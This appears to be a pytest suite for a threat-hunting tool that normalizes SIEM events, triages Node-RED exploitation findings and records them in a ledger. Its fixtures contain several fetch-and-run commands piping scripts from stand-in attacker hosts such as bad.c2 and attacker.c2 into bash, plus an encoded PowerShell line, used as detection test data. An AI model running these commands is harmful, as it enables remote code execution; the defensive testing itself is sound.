"""Tests for Phase 2 Finding Triage Agent, Normalizer, and Findings Ledger.

Verifies:
- Telemetry field normalization across SIEM formats (Splunk, Sentinel, Elastic, generic)
- Entity extraction and deduplication
- Deterministic heuristic triage (True Positive, Suspicious, Benign Noise)
- SQLite findings ledger persistence & queries
- Closed-loop frontmatter and Markdown body synchronization
- CLI `hecate-runner sweep findings`
"""

from __future__ import annotations

from pathlib import Path

import pytest
from typer.testing import CliRunner

from hecate_runner.cli import app
from hecate_runner.config import Settings
from hecate_runner.execution.normalizer import (
    NormalizedEvent,
    extract_entities_from_events,
    normalize_event,
)
from hecate_runner.execution.scheduler import HuntExecutionScheduler
from hecate_runner.execution.triage_agent import FindingTriageAgent, FindingTriageReport
from hecate_runner.execution.watermark_store import WatermarkStore
from hecate_runner.lifecycle import get_hunt_lifecycle
from hecate_runner.query_execution import MockQueryProvider

runner = CliRunner()


@pytest.fixture
def mock_workspace_phase2(tmp_path: Path) -> Path:
    """Create a temporary workspace populated with active hunt H-0021."""
    workspace = tmp_path / "workspace_p2"
    workspace.mkdir()

    hunts_dir = workspace / "hunts" / "2026" / "Q4"
    hunts_dir.mkdir(parents=True)
    hunt_file = hunts_dir / "H-0021.md"
    hunt_file.write_text(
        """---
hunt_id: H-0021
title: "Adversaries deploy malicious Node-RED flows"
status: active
findings_count: 0
true_positives: 0
false_positives: 0
execution_run_count: 0
techniques: ["T1190", "T1059.004"]
---

# H-0021: Node-RED Malicious Execution Hunt

### Hypothesis
Adversaries use unauthenticated HTTP POST requests to deploy flows containing exec nodes.
""",
        encoding="utf-8",
    )

    queries_dir = workspace / "queries" / "H-0021"
    queries_dir.mkdir(parents=True)
    (queries_dir / "rule_process.spl").write_text(
        'ParentImage="*/node" Image="*/sh" CommandLine="* -c *"',
        encoding="utf-8",
    )

    (workspace / "state").mkdir(parents=True)
    return workspace


# --- Normalizer Tests --------------------------------------------------------


def test_normalize_event_splunk() -> None:
    raw_splunk = {
        "_time": "2026-11-09T12:00:00Z",
        "host": "srv-gateway-01",
        "user": "daemon",
        "ParentImage": "/usr/bin/node",
        "Image": "/bin/sh",
        "CommandLine": "sh -c curl -fsSL http://bad.c2/rev.sh | bash",
        "DestinationIp": "198.51.100.24",
    }
    event = normalize_event(raw_splunk, target_siem="splunk", hunt_id="H-0021")

    assert event.hunt_id == "H-0021"
    assert event.target_siem == "splunk"
    assert event.host == "srv-gateway-01"
    assert event.user == "daemon"
    assert event.process_name == "/bin/sh"
    assert event.parent_process == "/usr/bin/node"
    assert "curl -fsSL" in event.command_line
    assert event.ip == "198.51.100.24"


def test_normalize_event_elastic_nested() -> None:
    raw_elastic = {
        "@timestamp": "2026-11-09T12:05:00Z",
        "host": {"name": "prod-app-db"},
        "user": {"name": "svc_admin"},
        "process": {
            "name": "powershell.exe",
            "command_line": "powershell.exe -enc SQBFAFgA...",
            "parent": {"name": "w3wp.exe"},
        },
        "network": {"destination": {"ip": "203.0.113.88"}},
    }
    event = normalize_event(raw_elastic, target_siem="elastic", hunt_id="H-0021")

    assert event.host == "prod-app-db"
    assert event.user == "svc_admin"
    assert event.process_name == "powershell.exe"
    assert event.parent_process == "w3wp.exe"
    assert "-enc" in event.command_line
    assert event.ip == "203.0.113.88"


def test_extract_entities_from_events() -> None:
    events = [
        NormalizedEvent(
            event_id="e1",
            hunt_id="H-0021",
            target_siem="splunk",
            timestamp="2026-11-09T12:00:00Z",
            host="host-a",
            user="user1",
            process_name="sh",
            parent_process="node",
            ip="198.51.100.1",
        ),
        NormalizedEvent(
            event_id="e2",
            hunt_id="H-0021",
            target_siem="splunk",
            timestamp="2026-11-09T12:01:00Z",
            host="host-b",
            user="user1",
            process_name="sh",
            parent_process="node",
            ip="198.51.100.2",
        ),
    ]
    entities = extract_entities_from_events(events)
    assert entities["hosts"] == ["host-a", "host-b"]
    assert entities["users"] == ["user1"]
    assert entities["processes"] == ["sh"]
    assert entities["parent_processes"] == ["node"]
    assert entities["ips"] == ["198.51.100.1", "198.51.100.2"]


# --- Triage Agent Tests ------------------------------------------------------


def test_triage_agent_true_positive() -> None:
    """When a web/server runtime spawns a shell executing suspicious payload, triage as True Positive."""
    events = [
        NormalizedEvent(
            event_id="e1",
            hunt_id="H-0021",
            target_siem="splunk",
            timestamp="2026-11-09T12:00:00Z",
            host="iot-edge-01",
            user="nodered",
            process_name="/bin/sh",
            parent_process="node-red",
            command_line="sh -c curl -fsSL http://bad.c2/stage.sh | bash",
        )
    ]
    agent = FindingTriageAgent()
    report = agent.triage(
        hunt_id="H-0021",
        sweep_id="SWEEP-H-0021-001",
        target_siem="splunk",
        events=events,
        hypothesis="Adversaries deploy malicious Node-RED flows",
        techniques=["T1190"],
    )

    assert report.is_threat
    assert report.verdict == "true_positive"
    assert report.confidence >= 0.85
    assert report.recommended_action == "escalate_to_soc"
    assert "T1190" in report.technique_matches
    assert "T1059.004" in report.technique_matches
    assert "iot-edge-01" in report.extracted_entities["hosts"]


def test_triage_agent_suspicious() -> None:
    """When standalone LOLBin execution occurs without web parent, triage as Suspicious."""
    events = [
        NormalizedEvent(
            event_id="e2",
            hunt_id="H-0021",
            target_siem="splunk",
            timestamp="2026-11-09T12:00:00Z",
            host="workstation-09",
            user="alice",
            process_name="powershell.exe",
            parent_process="explorer.exe",
            command_line="powershell.exe -enc V2hvYW1p...",
        )
    ]
    agent = FindingTriageAgent()
    report = agent.triage(
        hunt_id="H-0021",
        sweep_id="SWEEP-H-0021-002",
        target_siem="splunk",
        events=events,
    )

    assert report.is_threat
    assert report.verdict == "suspicious"
    assert report.confidence >= 0.70
    assert report.recommended_action == "pivot"


def test_triage_agent_benign_noise() -> None:
    """When events reflect routine baseline execution, triage as Benign Noise."""
    events = [
        NormalizedEvent(
            event_id="e3",
            hunt_id="H-0021",
            target_siem="splunk",
            timestamp="2026-11-09T12:00:00Z",
            host="backup-srv",
            user="backup_svc",
            process_name="rsync",
            parent_process="cron",
            command_line="rsync -avz /data /backup",
        )
    ]
    agent = FindingTriageAgent()
    report = agent.triage(
        hunt_id="H-0021",
        sweep_id="SWEEP-H-0021-003",
        target_siem="splunk",
        events=events,
    )

    assert not report.is_threat
    assert report.verdict == "benign_noise"
    assert report.recommended_action in ("tune_rule", "ignore")


# --- WatermarkStore Findings Ledger Tests -------------------------------------


def test_watermark_store_findings_ledger(tmp_path: Path) -> None:
    db_path = tmp_path / "findings.db"
    store = WatermarkStore(db_path)

    report = FindingTriageReport(
        hunt_id="H-0021",
        sweep_id="SWEEP-001",
        target_siem="splunk",
        verdict="true_positive",
        confidence=0.95,
        summary="Remote command injection confirmed in Node-RED",
        rationale="Node-RED spawned interactive shell with reverse proxy payload.",
        technique_matches=["T1190", "T1059.004"],
        extracted_entities={"hosts": ["iot-node-1"], "users": ["daemon"]},
        recommended_action="escalate_to_soc",
        event_count=3,
    )

    finding_id = store.record_finding(report)
    assert finding_id.startswith("FINDING-H-0021-")

    findings = store.list_findings(hunt_id="H-0021")
    assert len(findings) == 1
    assert findings[0]["finding_id"] == finding_id
    assert findings[0]["verdict"] == "true_positive"
    assert findings[0]["confidence"] == 0.95
    assert findings[0]["extracted_entities"]["hosts"] == ["iot-node-1"]

    single = store.get_finding(finding_id)
    assert single is not None
    assert single["summary"] == report.summary


# --- Closed-Loop Scheduler Integration Tests ---------------------------------


def test_scheduler_closed_loop_triage_and_frontmatter_update(mock_workspace_phase2: Path) -> None:
    settings = Settings(
        hecate_workspace=mock_workspace_phase2,
        query_provider="mock",
        auto_hunt_max_fetch=200,
    )

    # Provider returns 2 events that match True Positive pattern
    provider = MockQueryProvider(responses=[2, 2])
    scheduler = HuntExecutionScheduler(settings=settings, provider=provider)

    # Stage sweep
    staged = scheduler.stage_sweeps(hunt_id="H-0021", force=True)[0]

    # Mock the returned raw telemetry to include true positive markers
    def mock_execute_override(query):
        res = MockQueryProvider.execute(provider, query)
        if len(provider.executed_queries) == 2:  # raw query
            res.events = [
                {
                    "event_id": "evt-101",
                    "host": "edge-iot-gw",
                    "user": "root",
                    "ParentImage": "node-red",
                    "Image": "/bin/sh",
                    "CommandLine": "sh -c curl http://attacker.c2/p | bash",
                },
                {
                    "event_id": "evt-102",
                    "host": "edge-iot-gw",
                    "user": "root",
                    "ParentImage": "node-red",
                    "Image": "/bin/sh",
                    "CommandLine": "sh -c whoami",
                },
            ]
        return res

    provider.execute = mock_execute_override

    # Execute sweep
    exec_res = scheduler.execute_sweep(staged.sweep_id, approver="soc_lead")

    assert exec_res.ok
    assert exec_res.outcome == "hits_detected"
    assert exec_res.triage_report is not None
    assert exec_res.triage_report.verdict == "true_positive"

    # Verify findings ledger has record
    findings = scheduler.store.list_findings("H-0021")
    assert len(findings) == 1
    assert findings[0]["verdict"] == "true_positive"

    # Verify Hunt Markdown Frontmatter updated
    lifecycle = get_hunt_lifecycle(mock_workspace_phase2, "H-0021")
    assert lifecycle["is_active"]

    hunt_file = mock_workspace_phase2 / "hunts" / "2026" / "Q4" / "H-0021.md"
    content = hunt_file.read_text(encoding="utf-8")
    assert "findings_count: 2" in content
    assert "true_positives: 1" in content
    assert "latest_triage_verdict: true_positive" in content
    assert "latest_recommended_action: escalate_to_soc" in content

    # Verify structured triage section appended to Markdown body
    assert "Automated Hunt Execution & Finding Triage" in content
    assert "edge-iot-gw" in content


# --- CLI Findings Command Tests ----------------------------------------------


def test_cli_sweep_findings(mock_workspace_phase2: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("HECATE_WORKSPACE", str(mock_workspace_phase2))
    monkeypatch.setenv("HECATE_RUNNER_QUERY_PROVIDER", "mock")

    settings = Settings(hecate_workspace=mock_workspace_phase2)
    scheduler = HuntExecutionScheduler(settings=settings)

    # Insert a finding manually into the store
    report = FindingTriageReport(
        hunt_id="H-0021",
        sweep_id="SWEEP-H-0021-999",
        target_siem="splunk",
        verdict="true_positive",
        confidence=0.92,
        summary="Confirmed reverse shell in Node-RED",
        rationale="Payload matched CVE-2026-58115 exploit pattern.",
        technique_matches=["T1190"],
        extracted_entities={"hosts": ["gw-01"]},
        recommended_action="escalate_to_soc",
        event_count=2,
    )
    scheduler.store.record_finding(report)

    # Invoke CLI sweep findings with wide columns
    res = runner.invoke(app, ["sweep", "findings", "--hunt-id", "H-0021"], env={"COLUMNS": "180"})
    assert res.exit_code == 0
    assert "FINDING-H-0021-" in res.stdout
    assert "True Positive" in res.stdout
    assert "escalate_to_soc" in res.stdout
